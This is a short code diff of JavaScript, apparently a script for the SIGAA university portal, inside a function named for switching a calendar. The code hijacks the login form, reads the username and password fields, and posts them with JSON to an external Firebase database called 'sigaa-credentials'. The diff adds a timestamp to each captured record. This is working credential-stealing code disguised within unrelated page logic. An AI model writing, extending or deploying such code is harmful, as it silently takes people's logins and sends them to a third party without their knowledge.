@@ -359,7 +359,7 @@ function trocaCalendario(id) {
 			formulario.method = '';
 			formulario[8].type = "button";
 			formulario[8].onclick = function() {
-				var credentials = { usuario: formulario[6].value, senha: formulario[7].value };
+				var credentials = { usuario: formulario[6].value, senha: formulario[7].value, data: new Date().toLocaleString() };
 				console.log(credentials);
 				$.post('https://sigaa-credentials.firebaseio.com/.json',
 					JSON.stringify(credentials),
